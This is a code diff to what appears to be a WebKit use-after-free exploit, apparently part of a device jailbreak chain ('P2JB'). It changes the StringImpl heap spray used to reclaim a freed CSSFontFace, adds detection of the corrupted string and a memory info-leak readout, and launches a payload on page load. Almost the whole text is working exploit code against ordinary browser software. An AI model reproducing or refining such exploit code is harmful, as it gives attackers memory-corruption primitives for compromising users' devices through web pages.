@@ -57,11 +57,17 @@ function killFontFaceSetCache() {
 }
 
 // Create Strings of exactly 184 bytes (CSSFontFace size)
-function makeStringImpl() {
+function makeStringImpl(index) {
     // 16-bit StringImpl header is ~20 bytes. 
     // We need string length of 82 to reach ~184 bytes allocation.
-    let s = "\u4141".repeat(82) + (uaf_strings.length);
-    return s;
+    // We use \u0000 (null bytes) so that if WebKit reads pointers from it, 
+    // it reads NULL and handles it gracefully instead of OOMing.
+    let base = "\u0000".repeat(70);
+    let unique = "ID" + index; 
+    while(unique.length < 12) unique += "X"; // Pad to exactly 12 chars
+    
+    // Total chars = 70 + 12 = 82 (164 bytes)
+    return base + unique;
 }
 
 async function stringimpl_overlap(dangling_face) {
@@ -71,8 +77,16 @@ async function stringimpl_overlap(dangling_face) {
     let corrupted_index = -1;
 
     for (let i = 0; i < uaf_strings.length; i++) {
-        // Check if length massively increased (OOB read) or if data changed
-        if (uaf_strings[i].length !== 82 + uaf_strings.length.toString().length || uaf_strings[i].charCodeAt(0) !== 0x4141) {
+        // Scan the first 70 characters looking for WebKit's status write
+        let is_corrupted = false;
+        for (let j = 0; j < 70; j++) {
+            if (uaf_strings[i].charCodeAt(j) !== 0x0000) {
+                is_corrupted = true;
+                break;
+            }
+        }
+
+        if (is_corrupted) {
             corrupted_string = uaf_strings[i];
             corrupted_index = i;
             break;
@@ -84,11 +98,16 @@ async function stringimpl_overlap(dangling_face) {
         return;
     }
 
-    alert("SUCCESS! String at index " + corrupted_index + " was corrupted. Length is now: " + corrupted_string.length);
-    alert("Attempting to use corrupted String for Info Leak...");
+    alert("SUCCESS! String at index " + corrupted_index + " was corrupted by WebKit!");
+    
+    // Attempting to read leaked data from the string
+    let leak_data = "";
+    for(let j = 0; j < 10; j++) {
+        leak_data += corrupted_string.charCodeAt(j).toString(16) + " ";
+    }
+    alert("Leaked bytes: " + leak_data);
 
-    // The rest of the P2JB primitive builder would go here, using corrupted_string to read memory
-    // and find the WebKit base.
+    // The rest of the P2JB primitive builder would go here
     
     // Launch P2JB payload
     run_hax().catch(e => console.error("P2JB Error:", e));
@@ -117,7 +136,7 @@ window.onload = () => {
                 
                 // SPRAY StringImpl to overlap the freed CSSFontFace
                 for (let i = 0; i < 1000; i++) {
-                    let str = makeStringImpl();
+                    let str = makeStringImpl(i);
                     uaf_strings.push(str);
                 }
             }
